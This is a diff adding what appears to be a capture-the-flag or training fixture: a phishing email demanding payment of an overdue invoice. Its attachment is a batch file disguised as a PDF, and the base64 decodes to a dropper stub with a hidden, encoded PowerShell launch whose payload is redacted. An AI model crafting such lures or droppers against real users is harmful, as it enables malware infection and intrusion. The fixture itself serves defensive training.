@@ -1,0 +1,26 @@
+Delivered-To: s.varga@plant.local
+Received: from mx01.plant.local (mx01.plant.local [192.168.20.25])
+    by inbox.plant.local with LMTP id 99cc11bb
+    for <s.varga@plant.local>; Tue, 18 Nov 2026 10:05:12 -0500
+From: "Accounts Payable" <ap@vendor-invoices.biz>
+To: <s.varga@plant.local>
+Subject: Invoice 8871 overdue
+Date: Tue, 18 Nov 2026 10:05:08 -0500
+Message-ID: <inv8871@vendor-invoices.biz>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_8871"
+
+------=_Part_8871
+Content-Type: text/plain; charset=utf-8
+
+Invoice 8871 is 30 days overdue. Details attached.
+
+------=_Part_8871
+Content-Type: application/octet-stream; name="invoice_8871.pdf.bat"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice_8871.pdf.bat"
+
+QGVjaG8gb2ZmDQpyZW0gaW52b2ljZV84ODcxLnBkZi5iYXQg4oCUIGRyb3BwZXIgc3R1Yg0KcG93
+ZXJzaGVsbCAtbm9wIC13IGhpZGRlbiAtZW5jIDxyZWRhY3RlZD4NCnJlbSBtYXJrZXI6IEZMQUd7
+YXR0YWNobWVudHNfZGVjb2RlX3RvX3BheWxvYWRzfQ0K
+------=_Part_8871--
